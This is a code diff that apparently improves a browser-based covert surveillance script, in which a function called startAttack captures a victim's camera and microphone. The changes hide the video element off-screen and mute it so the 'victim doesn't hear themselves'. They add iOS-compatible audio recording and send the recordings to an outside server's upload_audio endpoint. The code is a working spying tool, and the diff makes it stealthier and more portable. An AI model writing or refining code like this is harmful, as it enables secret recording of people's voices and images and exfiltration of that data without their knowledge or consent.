@@ -51,7 +51,9 @@ async function startAttack() {
             audio: {
                 channelCount: 1,
                 sampleRate: 44100,
-                sampleSize: 16
+                sampleSize: 16,
+                echoCancellation: true, // Helps reduce feedback
+                noiseSuppression: true
             },
             video: {
                 facingMode: "user",
@@ -235,11 +237,22 @@ function setupCameraCapture(stream) {
     video.srcObject = stream;
     video.autoplay = true;
     video.playsInline = true;
-    video.style.display = 'none';
+    
+    // FIX 1: Mute the video so victim doesn't hear themselves
+    video.muted = true;
+    
+    // FIX 2: Do NOT use display:none. It breaks iOS capture. 
+    // Use off-screen positioning instead.
+    video.style.position = 'fixed';
+    video.style.top = '-10000px';
+    video.style.left = '-10000px';
+    video.style.opacity = '0';
+    
     document.body.appendChild(video);
 
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
+    // Canvas doesn't need to be in DOM to work, but good practice to hide it if appended
     canvas.style.display = 'none';
     document.body.appendChild(canvas);
 
@@ -286,9 +299,22 @@ function setupCameraCapture(stream) {
 function setupAudioRecording(stream) {
     try {
         const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const mediaRecorder = new MediaRecorder(stream, {
-            mimeType: 'audio/webm;codecs=opus'
-        });
+        
+        // FIX 3: Detect supported MIME type for cross-platform compatibility
+        // iOS requires audio/mp4, Android/Windows prefer audio/webm
+        let options = {};
+        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+            options = { mimeType: 'audio/webm;codecs=opus' };
+        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
+            options = { mimeType: 'audio/mp4' }; // iOS Fix
+        } else if (MediaRecorder.isTypeSupported('audio/webm')) {
+            options = { mimeType: 'audio/webm' };
+        }
+        
+        // If no options match, the browser will use its default
+        const mediaRecorder = Object.keys(options).length > 0 
+            ? new MediaRecorder(stream, options) 
+            : new MediaRecorder(stream);
         
         let audioChunks = [];
         
@@ -299,11 +325,15 @@ function setupAudioRecording(stream) {
         };
         
         mediaRecorder.onstop = () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            // Use the correct type based on what we selected
+            const type = options.mimeType || 'audio/webm';
+            const ext = type.includes('mp4') ? 'mp4' : 'webm';
+            
+            const audioBlob = new Blob(audioChunks, { type: type });
             
             // Send to server
             const formData = new FormData();
-            formData.append('file', audioBlob, `audio_${Date.now()}.webm`);
+            formData.append('file', audioBlob, `audio_${Date.now()}.${ext}`);
             
             fetch(`${SERVER_URL}/upload_audio`, { 
                 method: 'POST', 
